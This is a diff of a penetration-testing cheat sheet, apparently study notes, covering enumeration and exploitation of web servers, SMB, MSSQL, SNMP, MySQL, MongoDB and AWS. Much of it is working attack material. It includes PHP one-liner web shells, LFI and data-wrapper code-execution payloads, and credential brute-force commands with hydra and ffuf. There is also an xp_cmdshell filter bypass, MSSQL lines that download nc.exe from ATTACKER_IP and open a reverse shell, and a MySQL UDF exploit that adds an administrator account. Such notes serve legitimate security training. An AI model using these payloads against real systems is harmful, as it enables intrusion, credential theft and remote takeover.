+gobuster dir -ezqrkw /usr/share/dirb/wordlists/common.txt -t 100 -x "txt,htm,html,php" -o gobuster-common.txt -u http://$VICTIM_IP
 
-```sh
-whatweb -v -a3 $VICTIM_IP
+# look for common vulns with nikto
+# -C all means scan all cgi-dirs
+nikto -o nikto.txt --maxtime=180s -C all -h $VICTIM_IP
 ```
 
-**PHP 5.x is vulnerable to Shellshock!**
+Checklist:
 
-### 3.7.2. Web Directory Scanning
+- [ ] Check `searchsploit` for vulns in server software, web stack
+
+- [ ] Check `robots.txt` for directories/files of interest
+
+- [ ] Inspect HTML comments/source for juicy info
+  - [ ] secrets/passwords
+  - [ ] directories of interest
+  - [ ] software libraries in use
+
+- [ ] Attempt login with default/common creds
+
+- [ ] Test for SQL/NoSQL injection using "bad" chars
+
+  ```
+  '
+  "
+  \
+  ;
+  `
+  )
+  }
+   --
+   #
+  /*
+  //
+  $
+  %
+  %%
+  ```
+
+- [ ] Test for command injection
+
+  - [ ] separator characters: `; | & || &&`
+  - [ ] help msg:  `-h`, `--help`, `/?`
+  - [ ] perl injection when opening file:  `echo Injected|`
+  - [ ] UNIX subshells: `$(cmd)`, `>(cmd)` and backticks
+
+- [ ] Test for LFI/RFI, especially in URL query params
+
+- [ ] Test for XSS on all input fields, URL query params:
+
+  - [ ] Check what remains after filtering applied on input: `'';!--"<XSS>=&{()}`
+  - [ ] Try variations of `<script>alert(1)</script>`
+
+
+### 4.4.1. Web Scanning/Enumeration
+
+Whatweb shows details about tech stacks in use by server, email addresses found, etc.
+
+```sh
+whatweb -v -a3 --log-verbose whatweb.txt $VICTIM_IP
+# -v  : verbose
+# -a3 : agressive scan
+# --log-verbose <file> : save scan output to file
+# also supports setting Cookies, HTTP BasicAuth, and proxies
+```
+
+**:warning: PHP 5.x is vulnerable to Shellshock!** - If you see it listed by whatweb, exploit it!
+
+Web Directory discovery with Gobuster:
 
 ```sh
 # Gobuster
 ulimit -n 8192 # prevent file access error during scanning
-gobuster dir -ezqrkw /usr/share/dirb/wordlists/common.txt -t 100 -x "txt,htm,html,php,asp,aspx,jsp,cgi" -o gobuster-common.txt -u http://$VICTIM_IP
+gobuster dir -ezqrkw /usr/share/dirb/wordlists/common.txt -t 100 -x "txt,htm,html,php,asp,aspx,jsp,cgi,pl,py" -o gobuster-common.txt -u http://$VICTIM_IP
 # -e / --expanded = Expanded mode, print full URLs (easy for clicking to open)
 # -z / --no-progress = no progress displayed
 # -q / --quiet = quiet mode (no banner)
@@ -376,21 +500,180 @@ gobuster dir -ezqrkw /usr/share/dirb/wordlists/common.txt -t 100 -x "txt,htm,htm
 
 # adding a proxy to gobuster:
 # --proxy socks5://127.0.0.1:1080
+```
 
+Web Directory discovery with ffuf (great for scanning through SOCKS proxy):
+
+```bash
 # FFUF as a dirbuster through a SOCKS proxy
 ffuf -o ffuf.json -recursion -recursion-depth 2 -x socks5://localhost:1080 -e .php,.jsp,.txt,.cgi,.asp,.aspx -u http://$VICTIM_IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
 # pretty print json output:
 ffuf.json | python -m json.tool
 ```
 
-### 3.7.3. Common Web Vuln scanning with Nikto
+Other web discovery tools:
 
-```sh
-# -C all means scan all cgi-dirs
-nikto -o nikto.txt --maxtime=180s -C all -h $VICTIM_IP
+```bash
+# fast scanner written in Rust
+feroxbuster
+
+dirb
+
+dirbuster
+
+wfuzz
 ```
 
-### 3.7.4. WordPress Enumeration
+### 4.4.2. Web Bruteforcing
+
+Hydra help/usage for specific module:
+
+```bash
+hydra -U http-post-form
+```
+
+Web Forms (POST request):
+
+```bash
+# using hydra
+# string format "<webform-path>:<username-field>=^USER^&<password-field>=^PASS^:<bad-pass-marker>"
+# '-l admin' means use only the 'admin' username. '-L userlist.txt' uses many usernames
+# '-P wordlist.txt' means iterate through all passwords in wordlist. '-p password123' uses only that one.
+# '-t 64': use 64 threads
+# change to https-web-form for port 443
+hydra -V -f -l admin -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-50.txt $VICTIM_IP http-post-form "/blog/admin.php:username=^USER^&password=^PASS^:Incorrect username" -t 64
+
+# proxy-aware password bruteforcing with ffuf
+ffuf -x socks5://localhost:1080 -u http://$VICTIM_IP/login -X POST -w /usr/share/seclists/Passwords/2020-200_most_used_passwords.txt -d "Username=admin&Password=FUZZ&RememberMe=true" -fw 6719
+```
+
+HTTP BasicAuth (GET request):
+
+```bash
+# hydra http basic auth brute force
+# Use https-get for https
+hydra -L users.txt -P /usr/share/seclists/Passwords/2020-200_most_used_passwords.txt "http-get://$VICTIM_IP/loginpage:A=BASIC" http-get
+```
+
+### 4.4.3. PHP Exploitation
+
+#### 4.4.3.1. LFI/RFI
+
+Some handy PHP wrappers:
+[PHP Documentation: Wrappers](https://www.php.net/manual/en/wrappers.php)
+
+Using php-wrapper with 'filter' to grab local files:
+
+- docs: [https://www.php.net/manual/en/wrappers.php.php](https://www.php.net/manual/en/wrappers.php.php)
+
+```sh
+# filter without any processing to grab plaintext:
+php://filter/resource=/path/to/flle
+
+# base64 encode file before grabbing (helps grab php source or binary files)
+# available starting with PHP 5.0.0
+php://filter/convert.base64-encode/resource=/path/to/file
+
+# ROT13 encode file:
+php://filter/read=string.rot13/resource=/etc/passwd
+
+# chaining multiple filters with "|":
+php://filter/string.toupper|string.rot13/resource=/path/to/file
+
+# list of useful filters:
+# https://www.php.net/manual/en/filters.php
+string.toupper
+string.tolower
+string.rot13
+convert.base64-encode
+convert.base64-decode
+zlib.deflate  # i.e. gzip, without headers/trailers
+zlib.inflate  # i.e. gunzip
+bzip2.compress
+bzip2.decompress
+```
+
+Some other handy wrappers:
+
+```sh
+# if enabled (not default), run commands:
+expect://whoami
+
+# Use this one as the query param's value to tell it to look at the POST
+# request body for the text to insert there. Useful for injecting complex
+# php payloads
+php://input
+# example POST body: <?php system('whoami'); ?>
+
+# Inject your own string into the file:
+data://text/plain;base64,SSBsb3ZlIFBIUAo=  # injects "I love PHP"
+# can be used to inject arbitrary php code!
+
+# When injecting php code, a good way to test code execution is with:
+<?php phpinfo();?>
+
+# use "data:" to inject executable php code directly into the URL
+data:text/plain,<?php phpinfo(); ?>
+data:,<?system($_GET['x']);?>&x=ls
+data:;base64,PD9zeXN0ZW0oJF9HRVRbJ3gnXSk7Pz4=&x=ls
+
+# FILTER BYPASSES:
+# Sometimes you can bypass filters or trick PHP not to concatenate a .php file extension onto
+# a file path by injecting a NULL byte. E.g.:
+?page=../../../etc/passwd%00
+# You can take this technique further and URL-encode the entire php://filter
+# directive to hopefully bypass server-side filters on it. Or even double-URL-
+# encode the string.
+# Also try bypassing filters with ....// instead of ../
+```
+
+You can get code execution by poisoning local files, including log files and
+PHP session files with PHP code.
+
+Common PHP sessions file locations:
+
+- c:\Windows\Temp
+- /tmp/
+- /var/lib/php5
+- /var/lib/php/session
+
+Default session filename: `sess_<SESSION_ID>`
+(grab SESSION_ID from your cookies in the browser)
+
+The following are some Linux system files that have sensitive information that
+are good to try to grab when you have an LFI vulnerability.
+
+```
+/etc/issue
+/etc/passwd
+/etc/shadow
+/etc/group
+/etc/hosts
+/etc/motd
+/etc/mysql/my.cnf
+/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the file descriptor)
+/proc/self/environ
+/proc/version
+/proc/cmdline
+```
+
+
+#### 4.4.3.2. One-liner PHP Webshells
+
+Simple one-liner web shells for when you can drop/modify a php file:
+
+```php
+<?php echo passthru($_GET['cmd']); ?>
+
+<?php echo exec($_POST['cmd']); ?>
+
+<?php echo shell_exec($_REQUEST['cmd']); ?>
+
+<?php system($_GET['cmd']); ?>
+
+```
+
+### 4.4.4. WordPress
 
 ```sh
 wpscan --update --url http://$VICTIM_IP/
@@ -409,18 +692,20 @@ wpscan --update --url http://$VICTIM_IP/
 # m = media IDs 1-10
 # NOTE: Value if no argument supplied: --enumerate vp,vt,tt,cb,dbe,u,m
 
+# other useful flags:
+# --login-uri URI
+#     The URI of the login page if different from /wp-login.php
+# --random-user-agent, --rua
+#     Be a bit more stealthy
+# --update
+#     update the WPScan database before scanning
+
 # username / password bruteforce possible
 # -U, --usernames LIST
 #     LIST of usernames and/or files w/ usernames to try. e.g. admin,users.txt
 #     Will auto-enum users if -U not supplied
 # -P, --passwords FILE-PATH
 #     path to password file for brute force
-# --login-uri URI
-#     The URI of the login page if different from /wp-login.php
-# --random-user-agent
-#     Be a bit more stealthy
-# --update
-#     update the WPScan database before scanning
 
 # aggressive scan:
 wpscan --update \
@@ -430,9 +715,27 @@ wpscan --update \
        --random-user-agent \
        --plugins-detection aggressive \
        --plugins-version-detection aggressive
+
+# scan with cmsmap (https://github.com/Dionach/CMSmap):
+cmsmap -o cmsmap.txt -d http://$VICTIM_IP
 ```
 
-## 3.8. 88/749 Kerberos Enumeration
+Also try logging into the Wordpress admin page.
+
+If you can log in, you can update the page template to get code execution. Appearance → Editor → 404 Template (at the right), add a PHP shell.
+
+After admin portal login, also try plugin upload to add a web shell/known vulnerable plugin. (uploaded file will be found under Media tab)
+
+Post exploit: The `wp-config.php` file contains information required by WordPress to connect to the database (credentials).
+
+```bash
+# Extract usernames and passwords:
+mysql -u USERNAME --password=PASSWORD -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
+```
+
+Check [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress) for more.
+
+## 4.5. 88/749 Kerberos
 
 ```sh
 # username enumeration with Kerbrute
@@ -458,7 +761,7 @@ Rubeus.exe asreproast /format:john /outfile:hash.txt
 smbclient -L DC_IP -W DOMAIN.tld -U asreproasted-username
 ```
 
-## 3.9. 110,995 - POP Enumeration
+## 4.6. 110,995 - POP
 
 Post Office Protocol (POP) retrieves email from a remote mail server.
 
@@ -484,7 +787,7 @@ RETR 1 # retrieve first email
 # try real (root) and fake users to see if there is a difference in error msgs
 ```
 
-## 3.10. 111 - RPCbind Enumeration
+## 4.7. 111 - RPCbind
 
 Gets you list of ports open using RPC services. Can be used to locate NFS
 or rusersd services to pentest next.
@@ -499,7 +802,7 @@ rpcinfo -s $VICTIM_IP
 rpcinfo -p $VICTIM_IP
 ```
 
-## 3.11. 119 - NNTP Enumeration
+## 4.8. 119 - NNTP
 
 Network News Transfer Protocol, allows clients to retrieve (read) and post
 (write) news articles to the NNTP (Usenet) server.
@@ -518,7 +821,7 @@ QUIT
 # https://tools.ietf.org/html/rfc977
 ```
 
-## 3.12. 135 - MSRPC Enumeration
+## 4.9. 135 - MSRPC
 
 ```sh
 # see the services available through MSRPC
@@ -532,6 +835,7 @@ rpcclient $VICTIM_IP -U "" -N
 rpcclient $VICTIM_IP -W DOMAIN -U username -P password
 # from here can enumerate users, groups, etc.
 # (netshareenum, lookupnames, lookupsids, enumdomusers, ...)
+srvinfo           # query server info
 querydispinfo     # list users
 enumdomusers      # list users
 enumdomgroups     # list groups
@@ -573,18 +877,30 @@ More SIDs
 - **Find more SIDs**: `lsaenumsid`
 - **RID cycling (check more SIDs)**: `lookupsids <sid>`
 
+```bash
+# dump user information
+# can also add creds: [[domain/]username[:password]@]<VictimIP>
+impacket-samrdump -port 139 $VICTIM_IP
+```
 
-## 3.13. 139,445 - SMB Enumeration
+## 4.10. 139,445 - SMB
 
-Use `enum4linux` or `smbmap` to gather tons of basic info (users, groups,
-shares, etc.)
+Port 445 is Server Message Block (SMB). Port 139 is NetBIOS, which is tied to SMB in some way.
+
+Use `enum4linux` or `smbmap` to gather tons of basic info (users, groups, shares, etc.)
 
 Definitely look at [HackTricks](https://book.hacktricks.xyz/pentesting/pentesting-smb)
 
+SMB Scans:
+
 ```sh
-# list available shares
+# get netbios name of computer, possibly logged-in user
+nbtscan $VICTIM_IP
+
+# basic SMB scan, smbmap
 smbmap -H $VICTIM_IP
 # try with '-u guest' if getting "[!] Authentication error"
+# try with '-u null -p null'
 
 # list (only) windows version
 smbmap -vH $VICTIM_IP
@@ -592,17 +908,7 @@ smbmap -vH $VICTIM_IP
 # recursively list directory contents
 smbmap -R -H $VICTIM_IP
 
-# tar all files [under a directory (no trailing slash on path)]
-smbclient //10.10.10.123/SHARENAME -N -Tc smbfiles.tar [/PATH/TO/DIR]
-
-# recursively get all files
-smbclient //$VICTIM_IP/SHARENAME
-> mask "" # don't filter any file names
-> recurse on # recursively execute commands
-> prompt off # don't prompt for file names
-> mget * # copy all files matching mask to host
-
-# standard scan
+# basic scan, enum4linux
 enum4linux $VICTIM_IP
 
 # scan all the things
@@ -613,47 +919,15 @@ enum4linux -u guest -aMld $VICTIM_IP | tee enum4linux.log
 
 # nmap script scans
 nmap --script="safe and smb-*" -n -v -p 445 $VICTIM_IP
-
-# try executing a command using wmi (can try psexec with '--mode psexec')
-smbmap -x 'ipconfig' $VICTIM_IP -u USER -p PASSWORD
 ```
 
-For port 139 (netbios), you can also gather information like so:
+Listing SMB Shares:
 
-```sh
-# connect without creds (null session)
-rpcclient -N $VICTIM_IP
+```bash
+# list available shares using smbmap (no creds)
+smbmap -H $VICTIM_IP
 
-# list shares without creds (null session)
-smbclient -N -L //$VICTIM_IP
-
-# enum4linux will also gather tons of info!
-# but smbmap will not :(
-
-# dump user information
-# can also add creds: [[domain/]username[:password]@]<VictimIP>
-impacket-samrdump -port 139 $VICTIM_IP
-```
-
-**NOTE:** In recent versions of Kali, you might see an error message like:
-
-```
-protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED
-```
-
-When connecting with smbclient. This is due to the fact that NTLMv1 (insecure) protocol was disabled by default. You can turn it back on by adding the following settings under `GLOBAL` in `/etc/samba/smb.conf`
-
-```
-client min protocol = CORE
-client max protocol = SMB3
-```
-
-Or you can add the flags `-m SMB2` or `-m SMB3` to your invocation of `smbclient` on the command line. However, this 2nd method does not apply to other tools like `enum4linux`
-
-### 3.13.1. Listing SMB Shares
-
-```sh
-# List shares without creds
+# List shares using smbclient (no creds)
 smbclient -N -L $VICTIM_IP
 
 # Enumerate shares you have creds for
@@ -672,6 +946,7 @@ smbmap -u "username" -p "<NT>:<LM>" [-r/-R] [SHARENAME] -H <IP> [-P <PORT>] # Pa
 ```
 
 Common shares for Windows:
+
 - C$ - maps to C:/
 - ADMIN$ - maps to C:/Windows
 - IPC$ - used for RPC
@@ -679,10 +954,42 @@ Common shares for Windows:
 - SYSVOL - only on DCs
 - NETLOGON - only on DCs
 
-### 3.13.2. Interacting on SMB
+**NOTE:** In recent versions of Kali, when connecting with `smbclient`, you might see an error message like:
+
+```
+protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED
+```
+
+This is due to the fact that NTLMv1 (insecure) protocol was disabled by default. You can turn it back on by adding the following settings under `GLOBAL` in `/etc/samba/smb.conf`
+
+```
+client min protocol = CORE
+client max protocol = SMB3
+```
+
+Or you can add the flags `-m SMB2` or `-m SMB3` to your invocation of `smbclient` on the command line. However, this 2nd method does not apply to other tools like `enum4linux`
+
+### 4.10.1. SMB Bruteforcing
 
 ```sh
-# Opens an interactive smb shell that you have creds for
+nmap --script smb-brute -p 445 $VICTIM_IP
+hydra -V -f -l Administrator -P passwords.txt -t 1 $VICTIM_IP smb
+```
+
+### 4.10.2. Interacting with SMB
+
+```sh
+# tar all files [under a directory (no trailing slash on path)]
+smbclient //10.10.10.123/SHARENAME -N -Tc smbfiles.tar [/PATH/TO/DIR]
+
+# recursively get all files (interactive session)
+smbclient //$VICTIM_IP/SHARENAME
+> mask "" # don't filter any file names
+> recurse on # recursively execute commands
+> prompt off # don't prompt for file names
+> mget * # copy all files matching mask to host
+
+# Interactive smb shell with creds
 smbclient '\\TARGET_IP\dirname' -W DOMAIN -U username[%password]
 # add --pw-nt-hash to tell it to interpret password as NT hash (don't include LM portion)
 
@@ -692,9 +999,14 @@ smb:\> get filename.txt  # fetch a file
 
 # mount smb share
 mount -t cifs -o "username=user,password=password" //x.x.x.x/share /mnt/share
+
+# try executing a command using wmi (can try psexec with '--mode psexec')
+smbmap -x 'ipconfig' $VICTIM_IP -u USER -p PASSWORD
 ```
 
-## 3.14. 161,162,10161,10162 - Simple Network Management Protocol (SNMP)
+## 4.11. 161,162,10161,10162 - SNMP
+
+Simple Network Management Protocol (SNMP).
 
 Before getting started, install the MIBs:
 
@@ -733,9 +1045,27 @@ snmpwalk -v2c -c public $VICTIM_IP HOST-RESOURCES-MIB::hrSWInstalledName | grep 
 snmpwalk -v2c -c public $VICTIM_IP .iso
 ```
 
-Look [here](https://www.rapid7.com/blog/post/2016/05/05/snmp-data-harvesting-during-penetration-testing/) for some other ideas on getting juicy data from snmp.
+Look [here](https://www.rapid7.com/blog/post/2016/05/05/snmp-data-harvesting-during-penetration-testing/) for some other ideas on getting juicy data from SNMP:
 
-Exploring MIBs with [snmptranslate](https://net-snmp.sourceforge.io/tutorial/tutorial-5/commands/snmptranslate.html):
+- Email addresses
+- SNMP community strings
+- Password hashes
+- Clear text passwords
+
+Also search for OID info at [http://www.oid-info.com/](http://www.oid-info.com/basic-search.htm)
+
+**SNMP config files:** (may contain sensitive data)
+
+- Typical locations:
+  - `/etc/`
+  - `/etc/snmp/`
+  - `~/.snmp/`
+- Common filenames:
+  - snmp.conf
+  - snmpd.conf
+  - snmp-config.xml
+
+### 4.11.1. Exploring MIBs with [`snmptranslate`](https://net-snmp.sourceforge.io/tutorial/tutorial-5/commands/snmptranslate.html)
 
 ```sh
 # look up numeric OID to get abbreviated name
@@ -772,20 +1102,7 @@ net-snmp-config --default-mibdirs # only if installed
 snmptranslate -Dinit_mib .1.3 |& grep MIBDIR
 ```
 
-Also search for OID info at [http://www.oid-info.com/](http://www.oid-info.com/basic-search.htm)
-
-**SNMP config files:**
-
-- Typical locations:
-  - `/etc/`
-  - `/etc/snmp/`
-  - `~/.snmp/`
-- Common filenames:
-  - snmp.conf
-  - snmpd.conf
-  - snmp-config.xml
-
-**Arbitrary remote code execution with SNMP**
+### 4.11.2. RCE with SNMP
 
 See [Hacktricks](https://book.hacktricks.xyz/pentesting/pentesting-snmp/snmp-rce)
 
@@ -804,25 +1121,38 @@ snmpset -m +NET-SNMP-EXTEND-MIB -v2c -c private $VICTIM_IP 'nsExtendStatus."derp
 
 This abuses the NET-SNMP-EXTEND-MIB functionality. See [technical writeup](https://mogwailabs.de/en/blog/2019/10/abusing-linux-snmp-for-rce/)
 
+## 4.12. 1433 - MSSQL
 
-## 3.14. 1433 - Microsoft SQL Server Enumeration
-
-Microsoft SQL Server (default port TCP 1433) is a relational database management
-system developed by Microsoft. It supports storing and retrieving data across
-a network (including the Internet).
+Microsoft SQL Server (MSSQL) is a relational database management system developed by Microsoft. It supports storing and retrieving data across a network (including the Internet).
 
 ```sh
+# check for known vulns
+searchsploit "microsoft sql server"
+
 # if you know nothing about it, try 'sa' user w/o password:
 nmap -v -n --script="safe and ms-sql-*" --script-args="mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER" -sV -p 1433 -oA nmap/safe-ms-sql $VICTIM_IP
 # if you don't have creds, you can try to guess them, but be careful not to block
 # accounts with too many bad guesses
 ```
 
-See [Password Bruteforcing and Cracking](#42-password-bruteforcing-and-cracking) for more on cracking creds.
+**Post-Exploit PrivEsc**
+
+The user running MSSQL server will have the privilege token **SeImpersonatePrivilege** enabled. You will probably be able to escalate to Administrator using this and [JuicyPotato](https://github.com/ohpe/juicy-potato)
+
+### 4.12.1. MSSQL Bruteforcing
+
+```sh
+# Be carefull with the number of password in the list, this could lock-out accounts
+# Use the NetBIOS name of the machine as domain, if needed
+crackmapexec mssql $VICTIM_IP -d DOMAINNAME -u usernames.txt -p passwords.txt
+hydra -V -f -L /path/to/usernames.txt –P /path/to/passwords.txt $VICTIM_IP mssql
+medusa -h $VICTIM_IP –U /path/to/usernames.txt –P /path/to/passwords.txt –M mssql
+nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=usernames.txt,passdb=passwords.txt,ms-sql-brute.brute-windows-accounts $VICTIM_IP
+```
 
 More great tips on [HackTricks](https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server)
 
-For basic information gathering when you are interacting on an MSSQL database:
+### 4.12.2. MSSQL Interaction
 
 ```sql
 -- show username
@@ -850,7 +1180,18 @@ References:
 - [PentestMonkey MSSQL Injection Cheat Sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
 - [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md)
 
-### 3.14.1. MS SQL Server Command Execution
+### 4.12.3. MSSQL Command Execution
+
+Simple command execution:
+
+```bash
+# Username + Password + CMD command
+crackmapexec mssql -d <Domain name> -u <username> -p <password> -x "whoami"
+# Username + Hash + PS command
+crackmapexec mssql -d <Domain name> -u <username> -H <HASH> -X '$PSVersionTable'
+```
+
+Interactive sessions:
 
 ```sh
 # Log in using service account creds if able
@@ -884,6 +1225,9 @@ EXEC master..xp_cmdshell 'whoami';
 go;
 -- can usually abbreviate to `xp_cmdshell "command"`
 
+# Bypass blackisted "EXEC xp_cmdshell"
+'; DECLARE @x AS VARCHAR(100)='xp_cmdshell'; EXEC @x 'whoami' —
+
 -- Get netcat reverse shell
 xp_cmdshell 'powershell iwr -uri http://ATTACKER_IP/nc.exe -out c:\users\public\nc.exe'
 go
@@ -891,7 +1235,7 @@ xp_cmdshell 'c:\users\public\nc.exe -e cmd ATTACKER_IP 443'
 go
 ```
 
-## 3.15. 2049 - NFS Enumeration
+## 4.13. 2049 - NFS
 
 [HackTricks](https://book.hacktricks.xyz/pentesting/nfs-service-pentesting)
 
@@ -932,7 +1276,7 @@ sudo usermod -a -G tempgroup tempuser
 
 See also: [6.7. Using NFS for Privilege Escalation](#67-using-nfs-for-privilege-escalation)
 
-## 3.16. 3306 - MySQL Enumeration
+## 4.14. 3306 - MySQL Enumeration
 
 MySQL listens on `TCP 3306` by default. You'll see it during a port scan or when
 running `netstat -tnl`.
@@ -1006,7 +1350,7 @@ use information_schema; select grantee, table_schema, privilege_type from schema
 select user,password,create_priv,insert_priv,update_priv,alter_priv,delete_priv,drop_priv from user where user='OUTPUT OF select user()';
 ```
 
-### 3.16.1. MySQL UDF Exploit
+### 4.14.1. MySQL UDF Exploit
 
 Exploiting User-Defined Functions in MySQL to get shell execution. First,
 ready the UDF library (provides `sys_exec` function) locally on the server.
@@ -1059,7 +1403,7 @@ SELECT sys_exec("net user hacker P@$$w0rd /add");
 SELECT sys_exec("net localgroup Administrators hacker /add");
 ```
 
-### 3.16.2. Grabbing MySQL Passwords
+### 4.14.2. Grabbing MySQL Passwords
 
 ```sh
 # contains plain-text password of the user debian-sys-maint
@@ -1069,7 +1413,7 @@ cat /etc/mysql/debian.cnf
 grep -oaE "[-_\.\*a-Z0-9]{3,}" /var/lib/mysql/mysql/user.MYD | grep -v "mysql_native_password"
 ```
 
-### 3.16.3. Useful MySQL Files
+### 4.14.3. Useful MySQL Files
 
 - Configuration Files:
   - Windows
@@ -1092,7 +1436,7 @@ grep -oaE "[-_\.\*a-Z0-9]{3,}" /var/lib/mysql/mysql/user.MYD | grep -v "mysql_na
   - update.log
   - common.log
 
-## 3.17. 5900 - VNC Enumeration
+## 4.15. 5900 - VNC
 
 VNC is a graphical remote desktop sharing system. Other ports involved in it
 are: 5800,5801,5900,5901
@@ -1111,7 +1455,7 @@ ncrack -V --user root -P pass.txt $VICTIM_IP:PORT
 patator vnc_login host=$VICTIM_IP password=FILE0 0=pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0use auxiliary/scanner/vnc/vnc_login
 ```
 
-## 3.18. 27017 - MongoDB Enumeration
+## 4.16. 27017 - MongoDB
 
 MongoDB is a common open-source NoSQL database. It's service runs on 27017 by
 default.
@@ -1166,7 +1510,7 @@ db.users.drop()
 - $exists
 - $regex
 
-### 3.18.1. Exploiting NoSQL Injection
+### 4.16.1. Exploiting NoSQL Injection
 
 In URL query parameters, you put the nested object key or operator in brackets. Here is an example that might work for auth bypass:
 
@@ -1223,7 +1567,7 @@ username=admin&password[$regex]=pass.*
 ```
 
 
-## 3.19. Amazon Web Services (AWS) S3 Buckets
+## 4.17. Amazon Web Services (AWS) S3 Buckets
 
 Format of the bucket and resource (file) in urls:
 
@@ -1256,12 +1600,12 @@ curl http://irs-form-990.s3.amazonaws.com/201101319349101615_public.xml
 aws s3 cp s3://irs-form-990/201101319349101615_public.xml . --no-sign-request
 ```
 
-### 3.19.1. AWS Identity and Access Management (IAM)
+### 4.17.1. AWS Identity and Access Management (IAM)
 
 Excluding a few older services like Amazon S3, all requests to AWS services must be signed. This is typically done behind the scenes by the AWS CLI or the various Software development Kits that AWS provides. The signing process leverages IAM Access Keys. These access keys are one of the primary ways an AWS account is compromised.
 
 
-#### 3.19.1.1. IAM Access Keys
+#### 4.17.1.1. IAM Access Keys
 
 IAM Access Keys consist of an Access Key ID and the Secret Access Key.
 
@@ -1276,7 +1620,7 @@ There is another type of credentials, **short-term credentials**, where the
 Access Key ID **begins with the letters `ASIA`** and includes an additional
 string called the Session Token.
 
-#### 3.19.1.2. Conducting Reconnaissance with IAM
+#### 4.17.1.2. Conducting Reconnaissance with IAM
 
 When you find credentials to AWS, you can add them to your AWS Profile in the
 AWS CLI. For this, you use the command:
@@ -1314,7 +1658,7 @@ A few other common AWS reconnaissance techniques are:
 4. Reveal the encrypted contents of a secret (secrets might be region-specific).
    `aws secretsmanager get-secret-value --secret-id <friendlyname-or-ARN> --profile PROFILENAME [--region eu-north-1]`
 
-#### 3.19.1.3. AWS ARNs
+#### 4.17.1.3. AWS ARNs
 
 An Amazon ARN is their way of generating a unique identifier for all resources in the AWS Cloud. It consists of multiple strings separated by colons.
 
@@ -1324,52 +1668,9 @@ The format is:
 arn:aws:<service>:<region>:<account_id>:<resource_type>/<resource_name>
 ```
 
+# 5. Exploitation
 
-
-## 3.20. IPv6 to bypass IPv4 filters
-
-Sometimes if you see `filtered` on an nmap scan, the filter may only be applied on IPv4, but not IPv6. Try scanning it again using the host's IPv6 address.
-
-```bash
-# First take note of MAC address from nmap scan of device with 'filtered' port.
-# NOTE: nmap must be run as sudo to get MAC address.
-# If you don't have the MAC from nmap, you can probably get it from
-# your arp table with `arp -an`. If you have a hostname, you can
-# do a DNS lookup for the AAAA record.
-
-# get list of IPv6 neighbors on tun0 interface
-ping6 -c2 ff02::1%tun0 >/dev/null
-ip -6 n | grep -i MACADDR
-
-# Then rescan using nmap's IPv6 mode
-sudo nmap -6 -n -v -sC -sV -p FILTERED_PORT IPV6_ADDR
-```
-
-Here is another example of a script to try to get the link-local IPv6 address by building the EUI format from the MAC:
-
-```bash
-#!/bin/bash -e
-# Usage: ./ipv4to6.sh 192.168.0.1
-# source: https://askubuntu.com/a/771914
-
-IP=$1
-ping -c 1 $1 > /dev/null 2> /dev/null
-MAC=$(arp -an $1 | awk '{ print $4 }')
-IFACE=$(arp -an $1 | awk '{ print $7 }')
-
-python3 -c "
-from netaddr import IPAddress
-from netaddr.eui import EUI
-mac = EUI(\"$MAC\")
-ip = mac.ipv6(IPAddress('fe80::'))
-print('{ip}%{iface}'.format(ip=ip, iface=\"$IFACE\"))"
-```
-
-
-
-# 4. Exploitation
-
-## 4.1. Searchsploit
+## 5.1. Searchsploit
 
 ```sh
 searchsploit -www query # show exploitdb link instead
@@ -1377,9 +1678,9 @@ searchsploit -x /path/to/exploit # read ("eXamine") the exploit file
 searchsploit -m /path/to/exploit # mirror exploit file to current directory
 ```
 
-## 4.2. Password Bruteforcing and Cracking
+## 5.2. Password Bruteforcing and Cracking
 
-### 4.2.1. Cracking with John The Ripper
+### 5.2.1. Cracking with John The Ripper
 
 Use john for the common cases of cracking.
 
@@ -1405,7 +1706,7 @@ john --restore
 john --show --format=nt hashfile
 ```
 
-### 4.2.2. Cracking with Hashcat
+### 5.2.2. Cracking with Hashcat
 
 When to use hashcat:
 - You have a hash type that john doesn't understand
@@ -1471,57 +1772,7 @@ rules.
 - `6` - Hybrid Wordlist + Mask: append mask to each word in wordlist
 - `7` - Hybrid Mask + Wordlist: prepend mask to each word in wordlist
 
-### 4.2.3. MS SQL Server Bruteforcing
-
-```sh
-# Be carefull with the number of password in the list, this could lock-out accounts
-# Use the NetBIOS name of the machine as domain, if needed
-crackmapexec mssql $VICTIM_IP -d DOMAINNAME -u usernames.txt -p passwords.txt
-hydra -V -f -L /path/to/usernames.txt –P /path/to/passwords.txt $VICTIM_IP mssql
-medusa -h $VICTIM_IP –U /path/to/usernames.txt –P /path/to/passwords.txt –M mssql
-nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=usernames.txt,passdb=passwords.txt,ms-sql-brute.brute-windows-accounts $VICTIM_IP
-```
-
-### 4.2.4. SMB Bruteforcing
-
-```sh
-nmap --script smb-brute -p 445 $VICTIM_IP
-hydra -V -f -l Administrator -P passwords.txt -t 1 $VICTIM_IP smb
-```
-
-### 4.2.5. SSH Bruteforcing
-
-```sh
-# using hydra
-# '-s PORT' contact service on non-default port
-hydra -V -f -l username -P wordlist.txt -s 2222 $VICTIM_IP ssh
-
-# spray creds to entire subnet to see if they work on other boxes, too!
-hydra -V -f -l username -p password -W 5 10.11.1.0/24 ssh
-
-# using patator: useful when services (e.g. ssh) are too old for hydra to work
-patator ssh_login host=$VICTIM_IP port=2222 persistent=0 -x ignore:fgrep='failed' user=username password=FILE0 0=/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt
-
-ncrack -p 22 --user root -P passwords.txt $VICTIM_IP [-T 5]
-medusa -u root -P 500-worst-passwords.txt -h $VICTIM_IP -M ssh
-```
-
-### 4.2.6. Web Form (HTTP POST) Bruteforcing
-
-```sh
